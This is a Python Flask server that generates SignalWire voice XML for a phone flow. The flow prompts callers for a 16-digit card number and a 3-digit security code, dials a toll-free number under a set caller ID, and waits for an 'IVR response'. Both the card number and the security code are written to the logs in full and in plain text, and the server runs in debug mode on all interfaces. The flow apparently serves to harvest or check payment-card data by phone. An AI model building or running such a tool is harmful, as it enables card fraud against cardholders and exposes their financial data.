#!/usr/bin/env python3
"""
SignalWire Voice XML Web Server

Serves LAML (Voice XML) instructions for SignalWire calls.
Handles call flow for card validation and security code entry.
"""

from flask import Flask, request, Response
import logging
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/voice.xml', methods=['GET', 'POST'])
def voice_xml():
    """Generate Voice XML for call flow."""
    card_number = request.args.get('card_number', '')
    security_code = request.args.get('security_code', '')
    call_stage = request.args.get('stage', 'card_entry')
    
    logger.info(f"Voice XML request - Stage: {call_stage}, Card: {card_number[-4:] if card_number else 'N/A'}")
    
    if call_stage == 'card_entry':
        return generate_card_entry_xml(card_number)
    elif call_stage == 'security_code':
        return generate_security_code_xml(security_code)
    else:
        return generate_welcome_xml()

def generate_welcome_xml():
    """Generate welcome message."""
    xml = '''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Gather timeout="10" numDigits="16" action="/process_card" method="POST">
        <Say>Please enter your 16 digit card number.</Say>
    </Gather>
    <Say>I did not receive your card number. Goodbye.</Say>
    <Hangup/>
</Response>'''
    return Response(xml, mimetype='application/xml')

def generate_card_entry_xml(card_number):
    """Generate XML for card number entry."""
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say>Calling card validation system. Card number ending in {card_number[-4:]}.</Say>
    <Dial callerId="+12082473014">18003679617</Dial>
    <Pause length="5"/>
    <Gather timeout="10" numDigits="16" action="/process_card" method="POST">
        <Say>Please enter your 16 digit card number.</Say>
    </Gather>
    <Say>I did not receive your card number. Goodbye.</Say>
    <Hangup/>
</Response>'''
    return Response(xml, mimetype='application/xml')

def generate_security_code_xml(security_code):
    """Generate XML for security code entry."""
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say>Entering security code.</Say>
    <Gather timeout="10" numDigits="3" action="/process_security" method="POST">
        <Say>Please enter your 3 digit security code.</Say>
    </Gather>
    <Say>I did not receive your security code. Goodbye.</Say>
    <Hangup/>
</Response>'''
    return Response(xml, mimetype='application/xml')

@app.route('/process_card', methods=['POST'])
def process_card():
    """Process card number entry."""
    digits = request.form.get('Digits', '')
    logger.info(f"Card digits received: {digits}")
    
    # Generate XML to wait for IVR response
    xml = '''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say>Card number submitted. Waiting for response.</Say>
    <Pause length="10"/>
    <Say>Call completed. Goodbye.</Say>
    <Hangup/>
</Response>'''
    return Response(xml, mimetype='application/xml')

@app.route('/process_security', methods=['POST'])
def process_security():
    """Process security code entry."""
    digits = request.form.get('Digits', '')
    logger.info(f"Security code received: {digits}")
    
    xml = '''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say>Security code submitted. Waiting for response.</Say>
    <Pause length="10"/>
    <Say>Call completed. Goodbye.</Say>
    <Hangup/>
</Response>'''
    return Response(xml, mimetype='application/xml')

@app.route('/status/<call_id>', methods=['POST'])
def call_status(call_id):
    """Handle call status callbacks."""
    status = request.form.get('CallStatus', '')
    logger.info(f"Call {call_id} status: {status}")
    return Response('', status=200)

if __name__ == '__main__':
    logger.info("Starting SignalWire Voice XML Server on port 5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
